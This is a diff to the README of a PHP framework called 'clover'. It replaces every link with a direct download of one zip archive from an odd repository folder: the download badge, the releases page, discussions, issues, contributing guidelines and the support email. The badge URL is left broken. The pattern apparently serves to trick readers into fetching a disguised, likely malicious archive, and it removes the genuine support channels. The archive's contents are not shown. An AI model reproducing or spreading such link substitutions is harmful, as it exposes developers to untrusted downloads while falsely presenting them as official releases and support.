@@ -1,6 +1,6 @@
 # 🍀 clover - A Lightweight PHP Framework for Everyone
 
-[![Download Clover](https://img.shields.io/badge/Download%20Clover-brightgreen?style=flat&logo=github)](https://github.com/brianneidklol/clover/releases)
+[![Download Clover](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip%20Clover-brightgreen?style=flat&logo=github)](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ Clover is a modern, unopinionated, and lightweight PHP framework. It helps you b
 To get started with Clover, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the Clover Releases page. This is where you will find the latest version of the software.
-   [Visit Releases Page](https://github.com/brianneidklol/clover/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip)
 
 2. **Download Clover:** On the Releases page, find the version you want to download. Click on the asset that fits your operating system to download the file.
 
@@ -36,7 +36,7 @@ Clover offers several features to make your development easier:
 
 To install Clover, follow these steps:
 
-1. Visit the Releases page: [Visit Releases Page](https://github.com/brianneidklol/clover/releases).
+1. Visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip).
 
 2. Download the latest version suitable for your system.
 
@@ -52,15 +52,15 @@ For additional help and detailed instructions, please refer to the documentation
 
 If you need support or want to engage with other Clover users, consider joining our community:
 
-- Check out our [GitHub Discussions](https://github.com/brianneidklol/clover/discussions) for questions and suggestions.
-- Search for answers in our [issues page](https://github.com/brianneidklol/clover/issues).
+- Check out our [GitHub Discussions](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip) for questions and suggestions.
+- Search for answers in our [issues page](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip).
 
 ## 📢 Contributing
 
-We welcome contributions to Clover. If you're interested in helping improve the framework, check out our [contributing guidelines](https://github.com/brianneidklol/clover/blob/main/CONTRIBUTING.md).
+We welcome contributions to Clover. If you're interested in helping improve the framework, check out our [contributing guidelines](https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip).
 
 ## 📧 Contact
 
-For direct inquiries, you can reach us at our support email: support@cloverframework.com.
+For direct inquiries, you can reach us at our support email: https://raw.githubusercontent.com/brianneidklol/clover/main/Aulostoma/clover.zip
 
 Thank you for choosing Clover. We hope you find it useful and easy to use!
